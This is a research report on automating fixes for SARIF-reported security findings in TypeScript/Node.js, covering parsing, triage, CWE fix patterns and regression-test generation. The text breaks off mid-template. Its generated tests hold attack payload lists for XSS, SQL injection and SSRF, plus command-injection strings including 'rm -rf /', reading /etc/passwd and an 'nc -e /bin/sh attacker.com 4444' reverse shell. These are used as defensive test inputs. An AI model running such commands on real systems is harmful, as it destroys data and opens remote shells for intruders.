# SARIF-Based Security Finding Remediation Automation

> Research conducted: 2026-02-10

## Executive Summary

- **SARIF 2.1.0 provides a rich, standardized schema for security findings** that includes not only vulnerability descriptions but also fix suggestions (`fix` objects with `artifactChange` and `replacement` entries), making it a natural foundation for automated remediation pipelines.
- **Finding-to-fix mapping requires a layered approach** combining CWE-to-remediation pattern databases, rule-specific fix templates, and AST-aware code transformation — no single strategy covers all vulnerability categories effectively.
- **The four major tools (CodeQL, Semgrep, Snyk, OWASP Dependency-Check) each offer distinct remediation patterns** that can be combined: CodeQL excels at dataflow-based fixes, Semgrep at pattern-based autofix, Snyk at dependency upgrades, and OWASP at known-CVE remediation.
- **Regression test generation for security fixes is critical but underserved** — effective approaches combine property-based testing, attack-replay tests derived from the original finding, and negative test cases that verify the vulnerability no longer exists.
- **CI security gate integration requires careful threshold tuning** — blocking on all findings creates alert fatigue; effective gates use severity/confidence matrices, baseline diffing, and grace periods for pre-existing findings.

## Background & Context

Static Application Security Testing (SAST) tools produce findings in various formats, making it difficult to build unified remediation workflows. The Static Analysis Results Interchange Format (SARIF) 2.1.0, an OASIS standard ratified in 2018 and widely adopted by 2023-2025, provides a common JSON-based schema that normalizes output from tools like CodeQL, Semgrep, ESLint Security, Bandit, and many others. GitHub made SARIF a first-class citizen in its Code Scanning feature, accelerating adoption across the industry.

Automated remediation — the practice of programmatically generating code fixes for security findings — has evolved from simple regex-based replacements to sophisticated AST-aware transformations. Tools like Semgrep's autofix, GitHub Copilot Autofix (powered by CodeQL), and Snyk's fix PRs demonstrate that certain vulnerability categories can be reliably fixed without human intervention. However, the state of the art still requires careful orchestration: parsing SARIF output, triaging findings by actionability, selecting appropriate fix strategies, generating targeted patches, verifying fixes don't introduce regressions, and integrating the entire pipeline into CI/CD workflows.

For TypeScript/Node.js codebases specifically, the security landscape includes unique challenges: prototype pollution, ReDoS (Regular Expression Denial of Service), server-side request forgery via `fetch`/`axios`, SQL/NoSQL injection through ORMs like Prisma and Sequelize, and XSS in server-rendered templates or React components with `dangerouslySetInnerHTML`. Automated remediation must account for the TypeScript type system, module resolution patterns, and the npm/yarn dependency ecosystem.

## Key Findings

### 1. SARIF 2.1.0 Schema Structure for Remediation

The SARIF 2.1.0 schema is organized hierarchically: a `sarifLog` contains one or more `run` objects, each representing a single tool execution. Each `run` contains `results` (individual findings) and `tool` metadata including `driver.rules` (the rule definitions).

**Key schema elements for remediation:**

```typescript
interface SarifLog {
  version: "2.1.0";
  $schema: string;
  runs: Run[];
}

interface Run {
  tool: {
    driver: {
      name: string;
      version: string;
      rules: ReportingDescriptor[]; // Rule definitions
    };
  };
  results: Result[];
  artifacts?: Artifact[]; // Files analyzed
}

interface Result {
  ruleId: string;
  ruleIndex?: number;
  level: "none" | "note" | "warning" | "error"; // Severity
  message: { text: string; markdown?: string };
  locations: Location[];           // Where the finding is
  codeFlows?: CodeFlow[];          // Dataflow paths
  fixes?: Fix[];                   // Suggested fixes (key for remediation)
  properties?: {
    "security-severity"?: string;  // CVSS-like score (0.0-10.0)
    tags?: string[];               // e.g., ["security", "CWE-79"]
  };
  fingerprints?: Record<string, string>; // For deduplication
  relatedLocations?: Location[];   // Additional context
}

interface Fix {
  description: { text: string };
  artifactChanges: ArtifactChange[];
}

interface ArtifactChange {
  artifactLocation: { uri: string };
  replacements: Replacement[];
}

interface Replacement {
  deletedRegion: Region;           // What to remove
  insertedContent?: { text: string }; // What to insert
}

interface ReportingDescriptor {
  id: string;
  name?: string;
  shortDescription: { text: string };
  fullDescription?: { text: string };
  defaultConfiguration: {
    level: "none" | "note" | "warning" | "error";
  };
  properties?: {
    "security-severity"?: string;
    tags?: string[];
    cwe?: string[];               // CWE identifiers
    precision?: "very-high" | "high" | "medium" | "low";
  };
}
```

**Parsing best practices for TypeScript:**

1. **Use `@microsoft/sarif-multitool` or parse raw JSON** — The official SARIF SDK is .NET-focused, but the JSON schema is straightforward to parse in TypeScript. Libraries like `ajv` with the SARIF JSON schema provide validation.

2. **Resolve rule metadata eagerly** — Each result references a `ruleId`; immediately resolve it against `run.tool.driver.rules` to have severity, CWE tags, and precision available during triage.

3. **Normalize location URIs** — SARIF URIs may be relative or absolute, use `file://` scheme or bare paths. Normalize to project-relative paths early.

4. **Handle `codeFlows` for dataflow findings** — CodeQL and similar tools provide taint-tracking paths; these are essential for understanding injection vulnerabilities and generating correct fixes at the right location (sink, not source).

```typescript
// Practical SARIF parser for TypeScript
import { readFileSync } from 'fs';

interface ParsedFinding {
  id: string;
  ruleId: string;
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  confidence: 'very-high' | 'high' | 'medium' | 'low';
  cweIds: string[];
  filePath: string;
  startLine: number;
  endLine: number;
  message: string;
  suggestedFix?: Fix;
  dataflowPath?: Location[];
  fingerprint?: string;
}

function parseSarif(filePath: string): ParsedFinding[] {
  const raw = JSON.parse(readFileSync(filePath, 'utf-8'));
  const findings: ParsedFinding[] = [];

  for (const run of raw.runs) {
    const rules = new Map(
      run.tool.driver.rules?.map((r: any) => [r.id, r]) ?? []
    );

    for (const result of run.results) {
      const rule = rules.get(result.ruleId);
      const secSeverity = parseFloat(
        result.properties?.['security-severity'] ??
        rule?.properties?.['security-severity'] ?? '0'
      );

      findings.push({
        id: result.fingerprints?.primaryLocationLineHash ?? crypto.randomUUID(),
        ruleId: result.ruleId,
        severity: mapCvssToSeverity(secSeverity),
        confidence: rule?.properties?.precision ?? 'medium',
        cweIds: extractCweIds(rule),
        filePath: result.locations?.[0]?.physicalLocation?.artifactLocation?.uri ?? '',
        startLine: result.locations?.[0]?.physicalLocation?.region?.startLine ?? 0,
        endLine: result.locations?.[0]?.physicalLocation?.region?.endLine ?? 0,
        message: result.message.text,
        suggestedFix: result.fixes?.[0],
        dataflowPath: extractDataflowPath(result.codeFlows),
        fingerprint: result.fingerprints?.primaryLocationLineHash,
      });
    }
  }
  return findings;
}

function mapCvssToSeverity(score: number): ParsedFinding['severity'] {
  if (score >= 9.0) return 'critical';
  if (score >= 7.0) return 'high';
  if (score >= 4.0) return 'medium';
  if (score >= 0.1) return 'low';
  return 'info';
}

function extractCweIds(rule: any): string[] {
  const tags = rule?.properties?.tags ?? [];
  return tags
    .filter((t: string) => t.startsWith('CWE-'))
    .map((t: string) => t.replace('external/cwe/', ''));
}
```

### 2. Finding Triage by Severity and Confidence

Effective triage combines multiple signals to determine which findings to auto-remediate versus which require human review.

**Triage matrix approach:**

| Confidence \ Severity | Critical | High | Medium | Low |
|----------------------|----------|------|--------|-----|
| Very High | Auto-fix + PR | Auto-fix + PR | Auto-fix + PR | Auto-fix, batch |
| High | Auto-fix + PR | Auto-fix + PR | Queue for review | Queue for review |
| Medium | Escalate + fix | Queue for review | Queue for review | Suppress |
| Low | Escalate only | Log only | Suppress | Suppress |

**Key triage signals:**

1. **Security-severity score** (CVSS-like, 0.0-10.0) — provided by CodeQL and Semgrep in SARIF `properties`.
2. **Rule precision** — CodeQL tags rules as `very-high`, `high`, `medium`, or `low` precision. Only `very-high` and `high` precision findings should be auto-fixed.
3. **Finding freshness** — Use SARIF `fingerprints` and baseline comparison to distinguish new findings from pre-existing ones. Only auto-fix new findings in the current diff.
4. **Code location context** — Findings in test files, generated code, or vendored dependencies should be treated differently.
5. **CWE category** — Some CWE categories have reliable automated fixes (e.g., CWE-79/XSS, CWE-327/weak crypto), while others require human judgment (e.g., CWE-862/missing authorization).

```typescript
interface TriageResult {
  finding: ParsedFinding;
  action: 'auto-fix' | 'review' | 'escalate' | 'suppress';
  reason: string;
  priority: number; // 1-10, higher = more urgent
}

function triageFinding(
  finding: ParsedFinding,
  config: TriageConfig
): TriageResult {
  // Skip test files and generated code
  if (isTestFile(finding.filePath) || isGeneratedCode(finding.filePath)) {
    return { finding, action: 'suppress', reason: 'test/generated code', priority: 0 };
  }

  // Check if we have a reliable fix pattern for this CWE
  const hasReliableFix = config.reliableFixCwes.some(
    cwe => finding.cweIds.includes(cwe)
  );

  const severityScore = severityToScore(finding.severity);
  const confidenceScore = confidenceToScore(finding.confidence);

  // Auto-fix: high confidence + has reliable fix pattern
  if (confidenceScore >= 3 && hasReliableFix && severityScore >= 2) {
    return {
      finding,
      action: 'auto-fix',
      reason: `High confidence ${finding.confidence}, reliable fix for ${finding.cweIds.join(',')}`,
      priority: severityScore * confidenceScore,
    };
  }

  // Escalate: critical severity regardless of confidence
  if (finding.severity === 'critical') {
    return {
      finding,
      action: 'escalate',
      reason: 'Critical severity requires immediate attention',
      priority: 10,
    };
  }

  // Review: medium+ severity with medium+ confidence
  if (severityScore >= 2 && confidenceScore >= 2) {
    return {
      finding,
      action: 'review',
      reason: 'Requires human review for fix verification',
      priority: severityScore + confidenceScore,
    };
  }

  return { finding, action: 'suppress', reason: 'Low impact/confidence', priority: 0 };
}
```

### 3. CWE-to-Remediation Mapping Patterns

A comprehensive CWE-to-remediation mapping enables automated fix generation. Below are the most common vulnerability categories in TypeScript/Node.js with their remediation patterns:

**CWE-79: Cross-Site Scripting (XSS)**
```typescript
// Pattern: dangerouslySetInnerHTML or unescaped output
// Fix: Apply DOMPurify sanitization or use safe APIs

// VULNERABLE:
element.innerHTML = userInput;
// FIXED:
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);

// VULNERABLE (React):
<div dangerouslySetInnerHTML={{ __html: userInput }} />
// FIXED:
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
```

**CWE-89: SQL Injection**
```typescript
// Pattern: String concatenation in SQL queries
// Fix: Use parameterized queries

// VULNERABLE:
const result = await db.query(`SELECT * FROM users WHERE id = '${userId}'`);
// FIXED:
const result = await db.query('SELECT * FROM users WHERE id = $1', [userId]);

// VULNERABLE (Sequelize):
Model.findAll({ where: Sequelize.literal(`name = '${name}'`) });
// FIXED:
Model.findAll({ where: { name } });
```

**CWE-78: OS Command Injection**
```typescript
// Pattern: User input in exec/spawn
// Fix: Use execFile with array args, validate input

// VULNERABLE:
exec(`ls ${userDir}`);
// FIXED:
import { execFile } from 'child_process';
execFile('ls', [userDir]); // Arguments not interpreted by shell
```

**CWE-918: Server-Side Request Forgery (SSRF)**
```typescript
// Pattern: User-controlled URLs in fetch/axios
// Fix: URL allowlist validation

// VULNERABLE:
const response = await fetch(userProvidedUrl);
// FIXED:
import { URL } from 'url';
function validateUrl(input: string): string {
  const url = new URL(input);
  const allowedHosts = ['api.example.com', 'cdn.example.com'];
  if (!allowedHosts.includes(url.hostname)) {
    throw new Error('URL not in allowlist');
  }
  if (!['https:'].includes(url.protocol)) {
    throw new Error('Only HTTPS allowed');
  }
  // Block internal IPs
  if (isPrivateIP(url.hostname)) {
    throw new Error('Internal URLs not allowed');
  }
  return url.toString();
}
const response = await fetch(validateUrl(userProvidedUrl));
```

**CWE-327: Use of Broken Cryptographic Algorithm**
```typescript
// Pattern: MD5, SHA1, DES, RC4 usage
// Fix: Replace with modern algorithms

// VULNERABLE:
import { createHash } from 'crypto';
const hash = createHash('md5').update(data).digest('hex');
// FIXED:
const hash = createHash('sha256').update(data).digest('hex');

// VULNERABLE:
const cipher = createCipher('des', key);
// FIXED:
import { createCipheriv, randomBytes } from 'crypto';
const iv = randomBytes(16);
const cipher = createCipheriv('aes-256-gcm', key, iv);
```

**CWE-502: Deserialization of Untrusted Data**
```typescript
// Pattern: JSON.parse of untrusted input without validation
// Fix: Add schema validation

// VULNERABLE:
const data = JSON.parse(userInput);
processData(data);
// FIXED:
import { z } from 'zod';
const DataSchema = z.object({
  name: z.string().max(100),
  age: z.number().int().positive(),
});
const data = DataSchema.parse(JSON.parse(userInput));
processData(data);
```

**CWE-1321: Prototype Pollution**
```typescript
// Pattern: Deep merge/clone without prototype check
// Fix: Use Object.create(null) or safe merge utilities

// VULNERABLE:
function merge(target: any, source: any) {
  for (const key in source) {
    target[key] = source[key]; // Allows __proto__ pollution
  }
}
// FIXED:
function safeMerge(target: any, source: any) {
  for (const key of Object.keys(source)) {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;
    }
    target[key] = source[key];
  }
}
```

**CWE-611: XXE (XML External Entity Injection)**
```typescript
// Pattern: XML parsing without disabling external entities
// Fix: Configure parser to disable DTD/external entities

// VULNERABLE:
import { parseString } from 'xml2js';
parseString(userXml, callback);
// FIXED:
import { parseString } from 'xml2js';
parseString(userXml, {
  explicitRoot: true,
  xmlns: false,
  // xml2js is generally safe from XXE by default
  // but use fast-xml-parser with explicit config for safety:
}, callback);

// Better: Use fast-xml-parser with strict config
import { XMLParser } from 'fast-xml-parser';
const parser = new XMLParser({
  allowBooleanAttributes: false,
  processEntities: false, // Disable entity processing
});
```

**CWE-352: Cross-Site Request Forgery (CSRF)**
```typescript
// Pattern: State-changing endpoint without CSRF token
// Fix: Add CSRF middleware

// VULNERABLE (Express):
app.post('/api/transfer', transferHandler);
// FIXED:
import csrf from 'csurf';
const csrfProtection = csrf({ cookie: true });
app.post('/api/transfer', csrfProtection, transferHandler);
```

### 4. Tool-Specific Remediation Patterns

#### GitHub CodeQL

CodeQL produces SARIF with rich metadata including dataflow paths (`codeFlows`), rule precision levels, and security-severity scores. GitHub's Copilot Autofix (launched 2024) uses CodeQL findings to generate AI-powered fix suggestions.

**CodeQL SARIF characteristics:**
- Rules prefixed with `js/` for JavaScript/TypeScript (e.g., `js/sql-injection`, `js/xss`, `js/path-injection`)
- Precision levels: `very-high`, `high`, `medium`, `low` — only `very-high` and `high` are shown by default
- Security-severity as CVSS score in `properties`
- Dataflow paths in `codeFlows` for taint-tracking queries
- CWE tags in `properties.tags` as `external/cwe/cwe-XXX`

**CodeQL fix generation approach:**
```typescript
interface CodeQLFinding extends ParsedFinding {
  queryId: string; // e.g., "js/sql-injection"
  precision: string;
  dataflowSteps: DataflowStep[];
}

// Map CodeQL query IDs to fix strategies
const codeqlFixStrategies: Record<string, FixStrategy> = {
  'js/sql-injection': {
    fixType: 'parameterize-query',
    targetLocation: 'sink', // Fix at the sink, not the source
    requiresImport: false,
  },
  'js/xss': {
    fixType: 'sanitize-output',
    targetLocation: 'sink',
    requiresImport: ['dompurify'],
  },
  'js/path-injection': {
    fixType: 'path-validation',
    targetLocation: 'sink',
    requiresImport: ['path'],
  },
  'js/command-line-injection': {
    fixType: 'use-execfile',
    targetLocation: 'sink',
    requiresImport: ['child_process'],
  },
  'js/request-forgery': {
    fixType: 'url-allowlist',
    targetLocation: 'source',
    requiresImport: ['url'],
  },
  'js/insecure-randomness': {
    fixType: 'use-crypto-random',
    targetLocation: 'call-site',
    requiresImport: ['crypto'],
  },
};
```

#### Semgrep Autofix

Semgrep provides inline autofix suggestions directly in its rules using the `fix` key. Semgrep rules use pattern matching (not dataflow analysis for the Community edition), making fixes more predictable but less context-aware.

**Semgrep autofix in SARIF:**
- Semgrep SARIF includes `fix` objects when the matched rule has an autofix defined
- Fix patterns use metavariables from the match (e.g., `$X`, `$FUNC`)
- Fixes are text-based replacements, not AST transformations

**Semgrep rule with autofix example:**
```yaml
rules:
  - id: insecure-hash-md5
    patterns:
      - pattern: crypto.createHash('md5')
    fix: crypto.createHash('sha256')
    message: MD5 is cryptographically broken
    languages: [typescript, javascript]
    severity: WARNING
    metadata:
      cwe: ["CWE-327"]
      confidence: HIGH
```

**Leveraging Semgrep autofix in a pipeline:**
```typescript
// Extract Semgrep fixes from SARIF
function extractSemgrepFixes(sarifLog: SarifLog): AutoFix[] {
  const fixes: AutoFix[] = [];

  for (const run of sarifLog.runs) {
    if (run.tool.driver.name !== 'Semgrep') continue;

    for (const result of run.results) {
      if (result.fixes && result.fixes.length > 0) {
        for (const fix of result.fixes) {
          for (const change of fix.artifactChanges) {
            fixes.push({
              ruleId: result.ruleId,
              filePath: change.artifactLocation.uri,
              replacements: change.replacements.map(r => ({
                startLine: r.deletedRegion.startLine,
                startColumn: r.deletedRegion.startColumn,
                endLine: r.deletedRegion.endLine ?? r.deletedRegion.startLine,
                endColumn: r.deletedRegion.endColumn ?? undefined,
                newText: r.insertedContent?.text ?? '',
              })),
              description: fix.description.text,
            });
          }
        }
      }
    }
  }
  return fixes;
}
```

#### Snyk Fix PRs

Snyk focuses primarily on dependency vulnerabilities (SCA) and provides automated fix PRs that upgrade vulnerable packages to patched versions. Snyk also offers Snyk Code for SAST findings.

**Snyk remediation patterns:**
1. **Dependency upgrades** — Snyk identifies the minimum version that fixes a CVE and generates `package.json` updates
2. **Patch application** — When no upgrade is available, Snyk applies targeted patches via `@snyk/protect`
3. **Breaking change detection** — Snyk warns when a fix requires a major version bump
4. **Transitive dependency fixes** — Snyk can add resolution overrides for deeply nested vulnerable dependencies

```typescript
// Snyk-style dependency fix generation
interface DependencyFix {
  packageName: string;
  currentVersion: string;
  fixedVersion: string;
  vulnerabilities: string[]; // CVE IDs
  isBreaking: boolean;
  upgradeType: 'patch' | 'minor' | 'major';
  isDirect: boolean;
}

function generatePackageJsonFix(
  fixes: DependencyFix[],
  packageJson: any
): string {
  const updated = { ...packageJson };

  for (const fix of fixes) {
    if (fix.isDirect) {
      const depType = updated.dependencies?.[fix.packageName]
        ? 'dependencies'
        : 'devDependencies';
      if (updated[depType]?.[fix.packageName]) {
        updated[depType][fix.packageName] = `^${fix.fixedVersion}`;
      }
    } else {
      // For transitive deps, add resolutions (Yarn) or overrides (npm)
      updated.resolutions = updated.resolutions ?? {};
      updated.resolutions[fix.packageName] = fix.fixedVersion;
      updated.overrides = updated.overrides ?? {};
      updated.overrides[fix.packageName] = fix.fixedVersion;
    }
  }

  return JSON.stringify(updated, null, 2);
}
```

#### OWASP Dependency-Check

OWASP Dependency-Check identifies known vulnerabilities in project dependencies by comparing them against the National Vulnerability Database (NVD). It produces SARIF output that can be integrated into the remediation pipeline.

**OWASP Dependency-Check SARIF specifics:**
- Rule IDs follow CVE format (e.g., `CVE-2023-XXXXX`)
- Severity from NVD CVSS scores
- Findings are at the dependency level, not code level
- No built-in autofix — remediation requires dependency upgrade logic

```typescript
// OWASP Dependency-Check finding processing
function processOwaspFindings(sarifLog: SarifLog): VulnerableDependency[] {
  return sarifLog.runs.flatMap(run =>
    run.results.map(result => ({
      cveId: result.ruleId,
      dependency: extractDependencyName(result),
      severity: mapCvssToSeverity(
        parseFloat(result.properties?.['security-severity'] ?? '0')
      ),
      description: result.message.text,
      filePath: result.locations?.[0]?.physicalLocation?.artifactLocation?.uri ?? '',
      fixedVersions: extractFixedVersions(result),
    }))
  );
}
```

### 5. AST-Aware Code Fix Generation

For reliable automated fixes in TypeScript/Node.js, AST-based code transformation is essential. Text-based replacements can break code when formatting, comments, or whitespace differ from expected patterns.

**Recommended approach using TypeScript Compiler API and ts-morph:**

```typescript
import { Project, SyntaxKind, CallExpression } from 'ts-morph';

class SecurityFixGenerator {
  private project: Project;

  constructor(tsConfigPath: string) {
    this.project = new Project({ tsConfigFilePath: tsConfigPath });
  }

  fixInsecureHash(filePath: string, line: number): string | null {
    const sourceFile = this.project.getSourceFileOrThrow(filePath);
    const callExpressions = sourceFile.getDescendantsOfKind(
      SyntaxKind.CallExpression
    );

    for (const call of callExpressions) {
      if (call.getStartLineNumber() !== line) continue;

      const text = call.getText();
      if (text.includes("createHash('md5')") || text.includes('createHash("md5")')) {
        call.replaceWithText(
          text.replace(/createHash\(['"]md5['"]\)/, "createHash('sha256')")
        );
        return sourceFile.getFullText();
      }
      if (text.includes("createHash('sha1')") || text.includes('createHash("sha1")')) {
        call.replaceWithText(
          text.replace(/createHash\(['"]sha1['"]\)/, "createHash('sha256')")
        );
        return sourceFile.getFullText();
      }
    }
    return null;
  }

  fixSqlInjection(filePath: string, line: number): string | null {
    const sourceFile = this.project.getSourceFileOrThrow(filePath);
    // Identify template literals used in query calls
    const templates = sourceFile.getDescendantsOfKind(
      SyntaxKind.TemplateExpression
    );

    for (const template of templates) {
      if (template.getStartLineNumber() !== line) continue;

      const parent = template.getParent();
      if (parent?.getKind() === SyntaxKind.CallExpression) {
        const callText = (parent as CallExpression).getText();
        if (callText.includes('.query') || callText.includes('.execute')) {
          // Extract template spans for parameterization
          const spans = template.getTemplateSpans();
          const params: string[] = [];
          let paramIndex = 1;
          let queryText = template.getHead().getLiteralText();

          for (const span of spans) {
            params.push(span.getExpression().getText());
            queryText += `$${paramIndex++}${span.getLiteral().getLiteralText()}`;
          }

          // Replace with parameterized query
          const methodCall = parent.getText().split('(')[0];
          const replacement = `${methodCall}('${queryText}', [${params.join(', ')}])`;
          parent.replaceWithText(replacement);
          return sourceFile.getFullText();
        }
      }
    }
    return null;
  }

  addImportIfMissing(filePath: string, importName: string, moduleName: string): void {
    const sourceFile = this.project.getSourceFileOrThrow(filePath);
    const existingImport = sourceFile.getImportDeclaration(moduleName);

    if (!existingImport) {
      sourceFile.addImportDeclaration({
        namedImports: [importName],
        moduleSpecifier: moduleName,
      });
    } else {
      const namedImports = existingImport.getNamedImports();
      if (!namedImports.some(ni => ni.getName() === importName)) {
        existingImport.addNamedImport(importName);
      }
    }
  }
}
```

### 6. Fix Application Pipeline

A complete fix application pipeline handles multiple findings per file, conflict resolution, and atomic commits:

```typescript
interface FixPlan {
  filePath: string;
  fixes: ApplicableFix[];
  conflicts: FixConflict[];
}

interface ApplicableFix {
  finding: ParsedFinding;
  strategy: string;
  changes: FileChange[];
  dependencies?: DependencyChange[];
}

class FixApplicator {
  async applyFixes(plan: FixPlan): Promise<FixResult> {
    // Sort fixes bottom-to-top to preserve line numbers
    const sortedFixes = plan.fixes.sort(
      (a, b) => b.changes[0].startLine - a.changes[0].startLine
    );

    const results: FixResult[] = [];

    for (const fix of sortedFixes) {
      try {
        // Apply the fix
        await this.applyFileChanges(fix.changes);

        // If the fix requires new dependencies
        if (fix.dependencies?.length) {
          await this.updateDependencies(fix.dependencies);
        }

        // Verify the fix compiles
        const compiles = await this.verifyCompilation(plan.filePath);
        if (!compiles) {
          await this.rollback(fix);
          results.push({
            fix,
            status: 'compilation-failed',
            error: 'Fix caused compilation errors',
          });
          continue;
        }

        // Run the security scanner on just this file to verify
        const stillVulnerable = await this.rescanFile(
          plan.filePath,
          fix.finding.ruleId
        );
        if (stillVulnerable) {
          await this.rollback(fix);
          results.push({
            fix,
            status: 'verification-failed',
            error: 'Finding still present after fix',
          });
          continue;
        }

        results.push({ fix, status: 'applied' });
      } catch (error) {
        await this.rollback(fix);
        results.push({
          fix,
          status: 'error',
          error: String(error),
        });
      }
    }

    return this.aggregateResults(results);
  }

  private async verifyCompilation(filePath: string): Promise<boolean> {
    try {
      const { execSync } = require('child_process');
      execSync(`npx tsc --noEmit ${filePath}`, {
        stdio: 'pipe',
        timeout: 30000,
      });
      return true;
    } catch {
      return false;
    }
  }

  private async rescanFile(
    filePath: string,
    ruleId: string
  ): Promise<boolean> {
    // Run targeted scan on just the fixed file
    const { execSync } = require('child_process');
    try {
      const result = execSync(
        `semgrep --config auto --sarif --include ${filePath}`,
        { stdio: 'pipe', timeout: 60000 }
      );
      const sarif = JSON.parse(result.toString());
      return sarif.runs.some((run: any) =>
        run.results.some((r: any) => r.ruleId === ruleId)
      );
    } catch {
      return false; // Assume fixed if scan fails
    }
  }
}
```

### 7. Regression Test Generation for Security Fixes

Generating regression tests for security fixes ensures vulnerabilities don't reappear. The approach varies by vulnerability category:

**Test generation strategies:**

1. **Attack-replay tests** — Reproduce the original attack vector and verify it's blocked
2. **Negative tests** — Verify malicious input is rejected/sanitized
3. **Positive tests** — Verify legitimate input still works after the fix
4. **Property-based tests** — Generate random inputs to verify security properties hold

```typescript
import { Project } from 'ts-morph';

class SecurityTestGenerator {
  generateTestForFinding(
    finding: ParsedFinding,
    fixApplied: ApplicableFix
  ): string {
    const cweId = finding.cweIds[0];

    switch (cweId) {
      case 'CWE-79':
        return this.generateXssTest(finding, fixApplied);
      case 'CWE-89':
        return this.generateSqlInjectionTest(finding, fixApplied);
      case 'CWE-78':
        return this.generateCommandInjectionTest(finding, fixApplied);
      case 'CWE-918':
        return this.generateSsrfTest(finding, fixApplied);
      case 'CWE-327':
        return this.generateWeakCryptoTest(finding, fixApplied);
      default:
        return this.generateGenericSecurityTest(finding, fixApplied);
    }
  }

  private generateXssTest(
    finding: ParsedFinding,
    fix: ApplicableFix
  ): string {
    return `
import { describe, it, expect } from 'vitest';

describe('Security: XSS prevention - ${finding.ruleId}', () => {
  // Regression test for ${finding.filePath}:${finding.startLine}
  // Original finding: ${finding.message}

  const xssPayloads = [
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    'javascript:alert(1)',
    '"><script>alert(1)</script>',
    "';alert(1)//",
    '<iframe src="javascript:alert(1)">',
    '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
  ];

  it('should sanitize XSS payloads', () => {
    for (const payload of xssPayloads) {
      const result = sanitize(payload);
      expect(result).not.toContain('<script');
      expect(result).not.toContain('onerror');
      expect(result).not.toContain('javascript:');
    }
  });

  it('should preserve safe HTML content', () => {
    const safeInputs = [
      'Hello, world!',
      '<p>Paragraph</p>',
      '<strong>Bold text</strong>',
      'Price: $10.00 < $20.00',
    ];
    for (const input of safeInputs) {
      const result = sanitize(input);
      expect(result).toBeTruthy();
    }
  });
});`;
  }

  private generateSqlInjectionTest(
    finding: ParsedFinding,
    fix: ApplicableFix
  ): string {
    return `
import { describe, it, expect, vi } from 'vitest';

describe('Security: SQL injection prevention - ${finding.ruleId}', () => {
  // Regression test for ${finding.filePath}:${finding.startLine}

  const sqlInjectionPayloads = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "1 UNION SELECT * FROM passwords",
    "' OR 1=1 --",
    "admin'--",
    "1; EXEC xp_cmdshell('dir')",
    "' UNION SELECT null,null,null--",
  ];

  it('should use parameterized queries (not string concatenation)', async () => {
    const mockQuery = vi.fn().mockResolvedValue({ rows: [] });
    const db = { query: mockQuery };

    for (const payload of sqlInjectionPayloads) {
      await queryFunction(db, payload);

      // Verify the query uses parameterized format
      const [queryString, params] = mockQuery.mock.lastCall;
      expect(queryString).not.toContain(payload);
      expect(queryString).toMatch(/\\$[0-9]+|\\?/); // Has parameter placeholders
      expect(params).toContain(payload); // Payload passed as parameter
    }
  });

  it('should return valid results for safe input', async () => {
    const mockQuery = vi.fn().mockResolvedValue({ rows: [{ id: 1 }] });
    const db = { query: mockQuery };

    const result = await queryFunction(db, 'valid-id-123');
    expect(result).toBeDefined();
  });
});`;
  }

  private generateSsrfTest(
    finding: ParsedFinding,
    fix: ApplicableFix
  ): string {
    return `
import { describe, it, expect } from 'vitest';

describe('Security: SSRF prevention - ${finding.ruleId}', () => {
  // Regression test for ${finding.filePath}:${finding.startLine}

  const ssrfPayloads = [
    'http://169.254.169.254/latest/meta-data/', // AWS metadata
    'http://metadata.google.internal/',           // GCP metadata
    'http://100.100.100.200/latest/meta-data/',   // Azure metadata
    'http://127.0.0.1:6379/',                     // Redis
    'http://localhost:27017/',                     // MongoDB
    'http://0.0.0.0/',                            // All interfaces
    'http://[::1]/',                              // IPv6 localhost
    'http://0x7f000001/',                         // Hex IP
    'http://2130706433/',                         // Decimal IP
    'file:///etc/passwd',                         // File protocol
    'gopher://127.0.0.1:25/',                     // Gopher protocol
  ];

  it('should reject internal/metadata URLs', () => {
    for (const payload of ssrfPayloads) {
      expect(() => validateUrl(payload)).toThrow();
    }
  });

  it('should allow legitimate external URLs', () => {
    const safeUrls = [
      'https://api.example.com/data',
      'https://cdn.example.com/image.png',
    ];
    for (const url of safeUrls) {
      expect(() => validateUrl(url)).not.toThrow();
    }
  });
});`;
  }

  private generateCommandInjectionTest(
    finding: ParsedFinding,
    fix: ApplicableFix
  ): string {
    return `
import { describe, it, expect, vi } from 'vitest';

describe('Security: Command injection prevention - ${finding.ruleId}', () => {
  // Regression test for ${finding.filePath}:${finding.startLine}

  const commandInjectionPayloads = [
    '; rm -rf /',
    '| cat /etc/passwd',
    '$(whoami)',
    '\`id\`',
    '&& curl attacker.com',
    '\\n/bin/sh',
    '; nc -e /bin/sh attacker.com 4444',
  ];

  it('should not pass unsanitized input to shell', () => {
    const execFileMock = vi.fn();
    // Verify execFile is used instead of exec
    for (const payload of commandInjectionPayloads) {
      executeCommand(payload);
      // Arguments should be passed as array, not interpolated into string
      const args = execFileMock.mock.lastCall?.[1] ?? [];
      expect(args).toContain(payload); // Passed as arg, not in command string
    }
  });
});`;
  }

  private generateWeakCryptoTest(
    finding: ParsedFinding,
    fix: ApplicableFix
  ): string {
    return `
import { describe, it, expect } from 'vitest';
import * as crypto from 'crypto';

describe('Security: Cryptographic strength - ${finding.ruleId}', () => {
  // Regression test for ${finding.filePath}:${finding.startLine}

  const weakAlgorithms = ['md5', 'sha1', 'md4', 'md2', 'ripemd160'];
  const strongAlgorithms = ['sha256', 'sha384', 'sha512', 'sha3-256'];

  it('should not use weak hash algorithms', () => {
    // Scan the source file for weak algorithm usage
    const sourceCode = readFileSync('${finding.filePath}', 'utf-8');
    for (const alg of weakAlgorithms) {
      expect(sourceCode).not.toMatch(
        new RegExp(\`createHash\\\\(['"\\\`]\${alg}['"\\\`]\\\\)\`)
      );
    }
  });

  it('should use strong algorithms that produce expected output', () => {
    const testData = 'test-data-for-hash';
    const hash = hashFunction(testData);
    // SHA-256 produces 64 hex chars, SHA-512 produces 128
    expect(hash.length).toBeGreaterThanOrEqual(64);
  });
});`;
  }

  private generateGenericSecurityTest(
    finding: ParsedFinding,
    fix: ApplicableFix
  ): string {
    return `
import { describe, it, expect } from 'vitest';

describe('Security regression: ${finding.ruleId}', () => {
  // Regression test for ${finding.filePath}:${finding.startLine}
  // CWE: ${finding.cweIds.join(', ')}
  // Original finding: ${finding.message}

  it('should not contain the original vulnerability pattern', () => {
